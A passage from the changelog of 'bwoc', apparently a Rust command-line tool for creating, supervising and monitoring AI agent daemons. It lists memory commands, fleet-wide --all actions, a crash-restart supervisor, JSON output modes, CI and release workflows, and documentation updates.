  - `bwoc new --scope` / `--out-of-scope` — fill `{{scopeDescription}}` / `{{outOfScope}}` placeholders in AGENTS.md + persona/README.md
  - `bwoc new --mindsets a,b,c` / `--skills a,b,c` — seed stub `.md` files matching the SPEC.md scaffold
  - Manifest schema gained `scopeDescription` + `outOfScope` fields (optional)
  - IncarnationReport surfaces persona_filled + mindset_stubs + skill_stubs counts

- **CI + Release**:
  - `.github/workflows/ci.yml` — matrix build + test across `ubuntu-latest` · `macos-latest` · `windows-latest`; fmt + clippy gated on Ubuntu only (rules are OS-independent)
  - `.github/workflows/release.yml` — triggers on CalVer tag `v<YYYY>.<M>.<D>-<patch>`; 5-target release matrix (Linux x64 + Linux ARM64 + macOS Apple Silicon + macOS Intel + Windows x64); auto-creates GitHub Release with notes + SHA-256 sidecars; `fail_on_unmatched_files: true` so partial releases never ship
  - `.github/workflows/docs.yml` — naming-audit `notes/README.md` exemption added (category 5 slot READMEs)
  - `docs/en/RELEASING.en.md` + `docs/th/RELEASING.th.md` (bilingual pair) — pre-flight, tag-and-push, prerelease vs stable, rollback policy
  - `VERSION.md` "Dual Namespaces" — Cargo SemVer (auto-bumped per edit, dev checkpoint) + Release CalVer (public release identity, manual tag)

- **Refactor + hygiene**:
  - `crate::livecheck` module consolidates 5 byte-identical copies of `signal_zero_alive` / `running_pid` / `query_uptime` / `format_uptime` / `inbox_count` across status/doctor/workspace/dashboard/start
  - End-to-end smoke test at `crates/bwoc-cli/tests/smoke.rs` — `init → new → list` against a real tempdir
  - Test-friendly `cfg(unix)` gating on signal-0 / HOME-env / `/tmp`-path tests for Windows portability
  - `bwoc-agent` Windows stub: `serve_loop` + 4 helpers cfg-gated; non-Unix returns "daemon is Unix-only" exit 2

- **Docs sync**:
  - ROADMAP + README + VERSION.md + CLAUDE.md all kept current with shipped features; multiple per-iter sync commits
  - Root-level bilingual policy documented in CLAUDE.md (which docs require TH pair, which don't)
  - CHANGELOG Known Issues trimmed from 4 → 1 stale items removed
  - 4 implementation notes under `notes/`: bwoc-new UX, gap-analysis, Pages+release pipeline, Phase 2 ṭhiti surface backfill

**Late Phase 2 polish** (since the bullet block above)

- **Memory CRUD completed**:
  - `bwoc memory put <name> [--file <p>] [--force]` — write from stdin or file; atomic stage+rename
  - `bwoc memory search <query> [--json]` — case-insensitive substring across entries
  - `bwoc memory rm <name> [--yes]` — delete an entry (TTY confirm; refuses README.md and traversal)
  - `bwoc memory show --all [--json]` — print every entry concatenated with `# === <name> ===` headers (or JSON array); pairs with agent-boot context loading
  - `bwoc help memory` — topic doc covering all 4 CRUD verbs + search

- **Dashboard hotkey triad**:
  - `t` opens `bwoc spawn` in a new tmux window (chat — original)
  - `l` opens `bwoc log -f` in a new tmux window (daemon log live tail) — NEW
  - `i` opens `bwoc inbox --watch` in a new tmux window (inbox live tail) — NEW
  - Window naming `<agent-id>` / `<agent-id>-log` / `<agent-id>-inbox` so all three can coexist

- **`bwoc list` filter + ordering surface**:
  - `--inbox-pending` — filter to agents with unread envelopes
  - `--sort id | inbox | incarnated | backend` — stable sort with informative default
  - `--count` — emit just the row count (integer or `{"count": N}` with `--json`); short-circuits after filter+sort for shell-script idioms

- **`bwoc doctor`**:
  - WARN on oversized `agent.log` (10 MiB threshold; `--auto` truncates — diagnostic chatter)
  - WARN-only on oversized `inbox.jsonl` (5 MiB threshold; `--auto` explicitly refuses to discard user data — Sammā-vācā)
  - `--json` output with `{ results, summary, exit }` stable shape for CI gating
  - `bwoc help doctor` topic — full status taxonomy, all 7 checks, deliberate asymmetry on user-data handling

- **Workspace surfaces**:
  - `bwoc workspace info` text + JSON gained per-workspace `Resources` block (projects / notes / memory counts)
  - Dashboard banner shows the same counts

- **bwoc-agent**:
  - `--version` / `-V` / `--help` / `-h` flags (was: only `--serve` handled)

**Mass-action verb matrix + shell ergonomics** (latest batch)

- **Six verbs gain `--all`** for fleet-wide operations:
  - `bwoc stop --all` — signal-escalation per agent (STOP → SIGTERM → SIGKILL)
  - `bwoc start --all` — flip registry + spawn daemons (`--no-daemon` opt-out)
  - `bwoc status --all` — full detail block per agent (loop of single-agent view)
  - `bwoc check --all` — fleet-wide neutrality audit with `{ agents[], summary }` JSON
  - `bwoc ping --all` — mass liveness probe (not-running labeled but not failed)
  - (`bwoc list` is already always all-agents; `bwoc retire --all` deliberately omitted — destructive)
  - Each uses clap `ArgGroup` for the `name`/`--all` mutex; trying neither or both → parse error

- **Script-friendly read flags**:
  - `bwoc list --count` / `--names-only` — integer or bare ids for shell loops
  - `bwoc memory list --count` / `--names-only` — same on memory entries
  - `bwoc inbox <name> --count` — envelope count for `if [ $(...) -gt 0 ]`
  - `bwoc workspace info --path-only` — for `cd "$(bwoc workspace info --path-only)"`

- **List filters + sort**:
  - `--inbox-pending` (agents with unread envelopes), combinable with --running/--status/--backend
  - `--sort id | inbox | incarnated | backend` (stable; default = registry order)

- **`bwoc memory put` write modes**:
  - 3 sources: inline positional `[content]` > `--file <path>` > stdin
  - 3 write modes: create (default) / `--force` overwrite / `--append`
  - All atomic via .tmp staging + rename

- **`bwoc send`**: inline `<msg>` OR `--file <path>` (clap mutex; same UX as memory put)

- **Workspace attention summary** — `bwoc workspace info` + dashboard banner show
  total pending inbox count across all agents when > 0; cross-link to
  `bwoc list --inbox-pending` for the "what needs attention?" workflow.

- **`bwoc help` topics 10 → 11**: + `doctor` (status taxonomy + auto-fix policy)

**Process supervision + remaining UX polish** (most recent batch)

- **`bwoc supervise <agent>`** — restart-on-crash supervisor closes a
  Phase 2 "Remaining for ship" item. Spawns `bwoc-agent --serve`,
  waits, respawns on non-zero exit; rate-limited (default 10/min,
  `--max-restarts-per-min N`). Clean exit (status 0) stops the
  supervisor. SIGINT/SIGTERM via ctrlc → exit 0. Stderr → same
  `agent.log` as `bwoc start`, so `bwoc log -f` works against
  supervised daemons. Usage: `tmux new-window 'bwoc supervise alpha'`
  or inside the user's own systemd unit. New `ctrlc` dep on bwoc-cli
  (already a workspace dep for bwoc-agent).

- **`bwoc retire --keep-memory`** — third file mode between default
  (delete) and `--keep-files` (retain all). Removes everything under
  the agent dir EXCEPT `memories/`, preserving accumulated knowledge
  for future agents. clap mutex with `--keep-files`.

- **`bwoc inbox --all`** — print every agent's inbox concatenated,
  each preceded by a `=== <agent-id> (N message(s)) ===` header.
  Empty inboxes still get a header. `--clear` and `--watch` are
  refused with `--all` (mass-clear too destructive; mass-watch
  interleaves confusingly). JSON shape: `{ agents: [{ agent, total,
  shown, messages }] }`.

- **UPTIME column on every overview surface** — `bwoc list` (table)
  and `bwoc status` (table) gained UPTIME between BACKEND and INBOX/
  MODEL. `bwoc list --json` and `bwoc status --json` gained
  `running` + `uptime_seconds` (nullable). All four surfaces share
  the same `livecheck::query_uptime` + `format_uptime` data path.

- **`bwoc check --all`** — fleet-wide neutrality audit. Iterates the
  workspace registry, runs `audit()` per agent, prints per-agent
  sections + fleet summary. JSON shape: `{ workspace, agents[],
  summary }`. Exit 1 iff any agent has violations.

- **`bwoc ping --all`** — mass liveness probe across the workspace.
  Agents with no live socket get "not running" label (not a
  failure; they're just stopped). Protocol drift / connection errors
  → exit 1.

- **Memory write/sort ergonomics**:
  - `bwoc memory put <name> "inline"` — third source mode (precedence:
    inline > --file > stdin); trailing newline appended automatically
  - `bwoc memory put <name> --append` — accumulate to existing entry
    (read-modify-write staged atomically; clap mutex with `--force`)
  - `bwoc memory list --json` adds inline `count` + `total_bytes`
    aggregates
  - `bwoc memory list --sort name|size|modified` — mirror of
    `bwoc list --sort` for memory entries

- **`bwoc send <agent> --file <path>`** — second message source
  (clap mutex with inline `<msg>`); trailing newlines trimmed so
  vim/EOF newline doesn't bloat the envelope.

- **`bwoc help` topic 11 → 12**: + `script` (shell idioms for
  --count / --names-only / --json / --path-only across all read
  commands)

**Write-command JSON family + dashboard help + memory sort** (most recent)

- **JSON-everywhere completed across write commands**:
  - `bwoc new --json` — incarnation report `{ agent_id, target,
    registered_in, symlinks, mindset_stubs, skill_stubs, persona_filled }`
  - `bwoc start --json` (requires `--yes`) — `{ workspace, agent,
    daemon_spawned, daemon_pid, already_running, registry_updated }`
  - `bwoc stop --json` (requires `--yes`) — `{ workspace, agent,
    daemon_outcome, registry_updated }` (outcome: not_running /
    socket_ok / sigterm / sigkill / could_not_kill)
  - `bwoc retire --json` (requires `--yes`) — `{ workspace, agent,
    path, mode, registry_updated }` (mode: delete / keep_files /
    keep_memory)
  - `bwoc workspace prune --json` — `{ workspace, phantoms, orphans,
    applied, removed }` for CI gating
  - `bwoc supervise --json` — emits one structured event per action
    (watch_start / spawn / crash_respawn / clean_exit / rate_limit_hit /
    signal_stop / spawn_failed)
  - `bwoc inbox --watch --json` (was rejection, now streams) — one
    compact JSON envelope per line for log shippers
  - Safety guard on destructive verbs: --json requires --yes
    (scripted destructive ops without explicit ack → exit 2)

- **Dashboard `?` overlay** — centered help popup listing every
  hotkey, dismissed on any key. Footer gains a `?: help` chip.

- **`bwoc memory list --sort name|size|modified`** — mirror of
  `bwoc list --sort`. Default = name (alphabetical). Unknown field
  → exit 2 with accepted-values hint. Entry mtime captured via
  `metadata().modified()`.

- **`bwoc memory list --json` aggregates** — inline `count` +
  `total_bytes` fields so CI doesn't have to walk entries[] to
  compute totals.

- **`bwoc help --all`** — concatenated all-topics output with
  `# === <name> ===` Markdown-safe separators for offline reading
  or pipe into docs generator.

### Changed

- `modules/agent-template/README.md` — added badges, table of contents, and footer; trimmed the "Incarnating a New Agent" section to a quickstart that points at `docs/en/INCARNATION.en.md`.
- `README.md` "Getting Started > As an Agent Author" — replaced outdated manual `cp -r` recipe with the canonical `./scripts/incarnate.sh` invocation and link to `INCARNATION.en.md`.
- `README.md` FAQ — trimmed to top-3 + link to full `docs/en/FAQ.en.md`.
- `README.md` Status — trimmed to a summary table + link to `docs/en/ROADMAP.en.md` for the full phase plan.
- `VERSION.md` — restructured header to expose `Software-Version`, `Document-Version`, `Last-Updated` (UTC ISO 8601). Auto-managed by `.claude/hooks/auto-version.sh`.
- `crates/bwoc-cli/README.md` — added workspace command surface (`bwoc init`, `bwoc workspace info/validate`) and `--workspace` flag declaration.
- `modules/agent-template/conventions.md` — pointer to `docs/en/NAMING.en.md` as the comprehensive `*.md` naming standard; softened validation-checklist rule from "File names are kebab-case.md" to "Markdown file names follow NAMING.en.md (12 categories)"; renamed "Files & Directories" section to "Directories" since file naming now lives in NAMING.
- `modules/agent-template/docs/th/PHILOSOPHY.th.md` — corrected `## ๑. หลักธรรมหลัก ๑๔ ประการ` to `## ๑. หลักธรรมหลัก ๒๒ ประการ` to match the EN side (22 verified by counting groups A–F).
- `.claude/hooks/auto-version.sh` — two silent bugs fixed: (1) GNU-only sed `0,/regex/s||...|` replaced with portable `s|^version = "X.Y.Z"$|version = "X.Y.Z"|` for Cargo.toml bumps on macOS BSD sed; (2) out-of-repo file paths (e.g., `~/.claude/projects/.../memory/*.md` edits) no longer trigger Document-Version bumps — added early-exit when the file is not under the workspace root. Both verified via pipe-test.
- `modules/agent-template/AGENTS.md` reference set — unchanged (the v2.0 spec is the baseline this Phase implements).

### Deprecated

- `modules/cli/` — replaced by `crates/bwoc-cli/`. A stub README is left in place; the directory will be removed once nothing references it.

### Conventions

- **Root-level bilingual files**: `FILENAME.md` is the English canonical; `FILENAME.<lang>.md` is a translation (e.g. `VISION.md` ↔ `VISION.th.md`). Parallel to but distinct from the `docs/<lang>/` pattern used inside the agent template.

### Known Issues

- Two `CONTRIBUTING.md`-referenced policy files are HELD pending user direction: `.github/CODEOWNERS` (review-duty assignments) and `.github/ISSUE_TEMPLATE/config.yml` (Discussions URL + contact routing). The non-policy issue/PR templates (`bug_report.md`, `feature_request.md`, `PULL_REQUEST_TEMPLATE.md`) shipped earlier. See `.claude/loop-roadmap.md` for the HELD status detail.

## Pre-Phase-1

Framework specification existed prior to this changelog: `AGENTS.md` v2.0, the 22 Buddhist-framework mappings in `PHILOSOPHY.en.md`, the PRD (Ariyasacca 4), SRS (Magga 8), lifecycle, threat model (Taṇhā 3 + Sīla 5), and self-improvement (Paññā 3) documents.
